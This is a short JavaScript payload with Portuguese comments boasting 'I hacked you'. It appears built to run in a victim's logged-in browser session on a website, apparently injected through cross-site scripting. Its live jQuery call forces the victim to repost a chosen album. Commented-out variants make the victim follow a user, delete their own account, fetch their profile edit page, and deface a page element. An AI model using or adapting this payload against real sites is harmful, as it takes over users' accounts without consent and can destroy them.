// alert('Deu certo kkkkk');
// var testee = document.querySelector("#user-top > a.ml-10");
// testee.innerText = 'KKKK eu hackeei você!';

// $.ajax({url: '/user/follow/4318532',type: 'post',success: function(data) {alert('OK!')}});
//$.ajax({url: '/user/delete-account',type: 'post',success: function(data) {alert('OK!')}});
// $.ajax({url: '/user/edit',type: 'get',success: function(data) {console.log(data)}});
$.ajax({
  url: '/album/repost',
  type: 'post',
  data: {
    id: 10939787
  },
  success: function(data) {
    //alert('OK!');
  }
});

// kkkkkk
